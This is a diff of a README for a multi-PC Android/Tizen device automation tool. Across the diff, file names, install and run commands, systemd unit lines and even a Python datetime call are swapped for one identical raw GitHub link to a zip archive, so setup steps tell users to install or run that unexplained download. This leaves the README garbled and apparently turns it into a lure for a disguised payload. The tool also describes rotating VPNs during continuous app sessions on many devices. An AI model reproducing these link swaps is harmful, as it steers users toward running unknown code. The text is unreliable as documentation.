@@ -21,20 +21,20 @@ Manage and automate multiple Android/Tizen devices across multiple PCs from a si
 MULTI_PC_DEVICE_MANAGER/
 ├── agents/
 │   ├── scripts/
-│   │   ├── birthday_app.py
-│   │   ├── fitness_app.py
-│   │   ├── game_selector.py
-│   │   ├── main.py
-│   │   ├── nail_app.py
-│   │   ├── session_tracker.py
-│   │   └── vpn_app.py
-│   └── agent.py
+│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
+│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
+│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
+│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
+│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
+│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
+│   │   └── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
+│   └── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
 ├── master/
-│   └── master.py
+│   └── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
 ├── .env
-├── .env.example
+├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
 ├── Makefile
-└── requirements.txt
+└── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
 ```
 
 ## Setup
@@ -42,15 +42,15 @@ MULTI_PC_DEVICE_MANAGER/
 ### 1. Install Dependencies
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
 ```
 
 ### 2. Configure Environment
 
-Copy `.env.example` to `.env` and update:
+Copy `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` to `.env` and update:
 
 ```bash
-cp .env.example .env
+cp https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip .env
 nano .env
 ```
 
@@ -68,14 +68,14 @@ nano .env
 
 ```bash
 cd agents
-python3 agent.py
+python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
 ```
 
 Or use systemd service for auto-start (recommended).
 
 ### 4. Configure App Distribution
 
-Edit `master/master.py`:
+Edit `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip`:
 
 ```python
 # Global distribution (applies to all PCs unless overridden)
@@ -182,23 +182,23 @@ make agent
 cd master
 
 # List all devices
-python3 master.py list-all
+python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip list-all
 
 # List devices from PC1
-python3 master.py list --pc PC1
+python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip list --pc PC1
 
 # Run on all devices with distribution
-python3 master.py run-all
+python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip run-all
 
 # Run specific app on all devices
-python3 master.py run-all --app nail_app
+python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip run-all --app nail_app
 
 # Run on specific PC
-python3 master.py run-pc --pc PC1
-python3 master.py run-pc --pc PC2 --app birthday_app
+python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip run-pc --pc PC1
+python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip run-pc --pc PC2 --app birthday_app
 
 # Show distribution
-python3 master.py distribution
+python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip distribution
 ```
 
 ## App Distribution Logic
@@ -224,16 +224,16 @@ Example PC1 with 5 devices:
 1. **Device Discovery**: Master queries all agent PCs for connected devices
 2. **App Distribution**: Assigns apps to devices based on percentages
 3. **Execution**: Sends run commands to each agent PC
-4. **Agent Processing**: Each agent runs `main.py` with assigned app
+4. **Agent Processing**: Each agent runs `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` with assigned app
 5. **Session Loop**: 
    - Runs assigned app (or random if not specified)
-   - Tracks sessions in `sessions.json`
+   - Tracks sessions in `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip`
    - Changes VPN every 3 hours
    - Repeats continuously
 
 ## Session Tracking
 
-All sessions are tracked in `sessions.json`:
+All sessions are tracked in `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip`:
 
 ```json
 [
@@ -282,24 +282,24 @@ BASE_CHROME_PORT=9515
 
 ## Systemd Service (Auto-start Agents)
 
-Create `/etc/systemd/system/device-agent.service` on each agent PC:
+Create `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` on each agent PC:
 
 ```ini
 [Unit]
 Description=Device Automation Agent
-After=network.target
+https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
 
 [Service]
 Type=simple
 User=youruser
 WorkingDirectory=/path/to/MULTI_PC_DEVICE_MANAGER/agents
 Environment="PATH=/usr/bin:/usr/local/bin"
-ExecStart=/usr/bin/python3 agent.py
+ExecStart=/usr/bin/python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
 Restart=always
 RestartSec=10
 
 [Install]
-WantedBy=multi-user.target
+https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
 ```
 
 Enable and start:
@@ -340,7 +340,7 @@ BASE_CHROME_PORT=9515
 ```
 
 ### Distribution not 100%
-Edit percentages in `master.py` to total exactly 100:
+Edit percentages in `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` to total exactly 100:
 ```python
 APP_DISTRIBUTION = {
     "nail_app": 40,
@@ -353,7 +353,7 @@ APP_DISTRIBUTION = {
 
 ### Run specific app on subset of devices
 
-Modify `master.py` to add custom filtering:
+Modify `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` to add custom filtering:
 
 ```python
 def run_on_devices(device_filter=None, app_name=None):
@@ -369,7 +369,7 @@ def run_on_devices(device_filter=None, app_name=None):
 import datetime
 
 def get_distribution():
-    hour = datetime.datetime.now().hour
+    hour = https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip().hour
     if 9 <= hour < 17:  # Daytime
         return {"nail_app": 50, "birthday_app": 30, "fitness_app": 20}
     else:  # Evening
@@ -419,7 +419,7 @@ watch -n 10 'make list-all'
 ## Contributing
 
 1. Add new apps in `agents/scripts/`
-2. Register in `game_selector.py` GAMES dict
+2. Register in `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` GAMES dict
 3. Update distribution percentages
 4. Test with `make run-all APP=your_app`
 
